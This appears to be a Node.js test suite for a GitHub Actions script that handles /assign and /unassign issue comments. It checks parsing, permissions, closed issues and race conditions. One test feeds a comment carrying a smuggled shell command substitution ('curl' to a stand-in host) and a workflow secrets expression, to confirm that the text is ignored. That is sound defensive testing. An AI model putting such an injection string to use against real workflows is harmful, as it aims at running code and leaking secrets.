// Run with: node --test ".github/scripts/*.test.js"
const test = require('node:test');
const assert = require('node:assert/strict');
const run = require('./assign.js');
const { parseCommand, decide, MESSAGES } = run;

// `live` is the issue as GitHub has it now, which can differ from the comment's payload.
function fakeGithub({ assignable = true, live = null } = {}) {
  const calls = [];
  const github = {
    rest: {
      issues: {
        get: async () => ({ data: live }),
        addAssignees: async (args) => {
          calls.push(['addAssignees', args]);
          return { data: { assignees: assignable ? args.assignees.map((login) => ({ login })) : [] } };
        },
        removeAssignees: async (args) => calls.push(['removeAssignees', args]),
        createComment: async (args) => calls.push(['createComment', args]),
      },
    },
  };
  return { github, calls };
}

const core = { info: () => {} };

// Runs the handler. GitHub's live issue matches the comment's payload unless the fake was given `live`.
function runWith(github, ctx) {
  const { state, assignees } = ctx.payload.issue;
  const get = github.rest.issues.get;
  github.rest.issues.get = async (args) => ({ data: (await get(args)).data || { state, assignees } });
  return run({ github, context: ctx, core });
}

function context({ body, login = 'maya-rao', assignees = [], state = 'open', pr = false, type = 'User' }) {
  return {
    repo: { owner: 'existence-master', repo: 'Sentient' },
    payload: {
      issue: {
        number: 42,
        state,
        assignees: assignees.map((a) => ({ login: a })),
        ...(pr ? { pull_request: { url: 'https://api.github.com/x' } } : {}),
      },
      comment: { body, user: { login, type } },
    },
  };
}

test('only an exact command counts', () => {
  assert.equal(parseCommand('/assign'), 'assign');
  assert.equal(parseCommand('  /assign\n'), 'assign');
  assert.equal(parseCommand('/unassign'), 'unassign');
  assert.equal(parseCommand('/assign please'), null);
  assert.equal(parseCommand('I will /assign myself'), null);
  assert.equal(parseCommand('/assign @someone'), null);
  assert.equal(parseCommand(''), null);
  assert.equal(parseCommand(undefined), null);
});

test('decide covers every case', () => {
  const free = { commenter: 'maya', assignees: [], issueState: 'open' };
  assert.equal(decide({ ...free, command: 'assign' }).action, 'assign');
  assert.equal(decide({ ...free, command: 'assign', assignees: ['Maya'] }).action, 'none');
  assert.equal(decide({ ...free, command: 'assign', assignees: ['Maya'] }).reply, MESSAGES.alreadyYours);
  const taken = decide({ ...free, command: 'assign', assignees: ['ravi'] });
  assert.equal(taken.action, 'none');
  assert.match(taken.reply, /@ravi is already working on this/);
  assert.equal(decide({ ...free, command: 'unassign', assignees: ['maya'] }).action, 'unassign');
  assert.match(decide({ ...free, command: 'unassign', assignees: ['ravi'] }).reply, /Only the person working on this \(@ravi\)/);
  assert.equal(decide({ ...free, command: 'unassign' }).reply, MESSAGES.notAssigned);
  assert.equal(decide({ ...free, command: 'assign', issueState: 'closed' }).reply, MESSAGES.closed);
});

test('/assign on a free issue assigns the commenter and says so', async () => {
  const { github, calls } = fakeGithub();
  await runWith(github, context({ body: '/assign' }));
  assert.deepEqual(calls[0], ['addAssignees', { owner: 'existence-master', repo: 'Sentient', issue_number: 42, assignees: ['maya-rao'] }]);
  assert.equal(calls[1][0], 'createComment');
  assert.equal(calls[1][1].body, `@maya-rao ${MESSAGES.assigned}`);
  assert.equal(calls.length, 2);
});

test('/assign on a taken issue only replies with who has it', async () => {
  const { github, calls } = fakeGithub();
  await runWith(github, context({ body: '/assign', assignees: ['ravi'] }));
  assert.equal(calls.length, 1);
  assert.equal(calls[0][0], 'createComment');
  assert.match(calls[0][1].body, /^@maya-rao Thanks for offering to help! @ravi is already working on this one/);
});

test('/unassign by the assignee removes them', async () => {
  const { github, calls } = fakeGithub();
  await runWith(github, context({ body: '/unassign', assignees: ['maya-rao'] }));
  assert.deepEqual(calls[0], ['removeAssignees', { owner: 'existence-master', repo: 'Sentient', issue_number: 42, assignees: ['maya-rao'] }]);
  assert.equal(calls[1][1].body, `@maya-rao ${MESSAGES.unassigned}`);
});

test('/unassign by someone else changes nothing', async () => {
  const { github, calls } = fakeGithub();
  await runWith(github, context({ body: '/unassign', assignees: ['ravi'] }));
  assert.equal(calls.length, 1);
  assert.equal(calls[0][0], 'createComment');
});

test('comments on pull requests, from bots, and other text are ignored', async () => {
  for (const ctx of [
    context({ body: '/assign', pr: true }),
    context({ body: '/assign', type: 'Bot', login: 'coderabbitai[bot]' }),
    context({ body: 'looks good, /assign me later' }),
  ]) {
    const { github, calls } = fakeGithub();
    await runWith(github, ctx);
    assert.equal(calls.length, 0);
  }
});

test('a silently dropped assignment is reported, not claimed', async () => {
  const { github, calls } = fakeGithub({ assignable: false });
  await runWith(github, context({ body: '/assign' }));
  assert.equal(calls[1][1].body, `@maya-rao ${MESSAGES.failed}`);
});

test('two quick /assign comments: the second sees the first claim', async () => {
  // Both payloads say the issue is free, but by the time the second job runs GitHub has the first claimer.
  const { github, calls } = fakeGithub({ live: { state: 'open', assignees: [{ login: 'ravi' }] } });
  await runWith(github, context({ body: '/assign' }));
  assert.equal(calls.length, 1);
  assert.match(calls[0][1].body, /@ravi is already working on this one/);
});

test('an issue closed since the comment is not assigned', async () => {
  const { github, calls } = fakeGithub({ live: { state: 'closed', assignees: [] } });
  await runWith(github, context({ body: '/assign' }));
  assert.deepEqual(calls.map((c) => c[0]), ['createComment']);
  assert.equal(calls[0][1].body, `@maya-rao ${MESSAGES.closed}`);
});

test('the comment text never reaches the API or a reply', async () => {
  const { github, calls } = fakeGithub();
  const body = '/assign\n$(curl evil) ${{ secrets.X }}';
  await runWith(github, context({ body }));
  assert.equal(calls.length, 0);
});
